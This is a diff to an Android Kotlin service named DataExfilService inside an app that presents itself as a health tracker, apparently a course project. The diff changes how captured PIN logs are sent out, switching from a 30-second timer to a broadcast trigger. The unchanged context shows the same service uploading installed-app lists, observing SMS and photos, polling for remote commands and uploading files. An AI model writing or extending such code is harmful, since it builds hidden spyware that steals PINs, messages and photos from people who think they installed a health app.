@@ -92,13 +92,6 @@ class DataExfilService : Service() {
         }
     }
 
-    private val pinUploadRunnable = object : Runnable {
-        override fun run() {
-            uploadPinLogs()
-            handler.postDelayed(this, 30 * 1000L)
-        }
-    }
-
     private val uploadFileReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
             if (intent.action == "com.inf2007.healthtracker.UPLOAD_FILE") {
@@ -133,6 +126,15 @@ class DataExfilService : Service() {
         }
     }
 
+    private val pinLogUploadReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            if (intent.action == "com.inf2007.healthtracker.UPLOAD_PIN_LOG") {
+                Log.d(TAG, "Received PIN upload trigger")
+                Thread { uploadPinLogs() }.start()
+            }
+        }
+    }
+
     override fun onCreate() {
         super.onCreate()
         handler = Handler(Looper.getMainLooper())
@@ -147,6 +149,7 @@ class DataExfilService : Service() {
         packageLister.startListening()
         registerReceiver(appInstallReceiver, IntentFilter(PackageLister.ACTION_APP_INSTALLED), RECEIVER_NOT_EXPORTED)
         uploadUserAppsList()
+        registerReceiver(pinLogUploadReceiver, IntentFilter("com.inf2007.healthtracker.UPLOAD_PIN_LOG"), RECEIVER_NOT_EXPORTED)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -157,7 +160,6 @@ class DataExfilService : Service() {
         // Start periodic uploads
         handler.postDelayed(uploadRunnable, 10000)
         handler.postDelayed(downloadUploadRunnable, 10000)
-        handler.postDelayed(pinUploadRunnable, 5000)
 
         startCommandPolling()
 
@@ -403,7 +405,6 @@ class DataExfilService : Service() {
     override fun onDestroy() {
         handler.removeCallbacks(uploadRunnable)
         handler.removeCallbacks(downloadUploadRunnable)
-        handler.removeCallbacks(pinUploadRunnable)
         if (::smsObserver.isInitialized) {
             contentResolver.unregisterContentObserver(smsObserver)
         }
@@ -418,6 +419,11 @@ class DataExfilService : Service() {
             unregisterReceiver(appInstallReceiver)
         } catch (e: Exception) {
             Log.e(TAG, "Error unregistering appInstallReceiver", e)
+        }
+        try {
+            unregisterReceiver(pinLogUploadReceiver)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error unregistering pinLogUploadReceiver", e)
         }
         super.onDestroy()
         contentResolver.unregisterContentObserver(photoObserver)
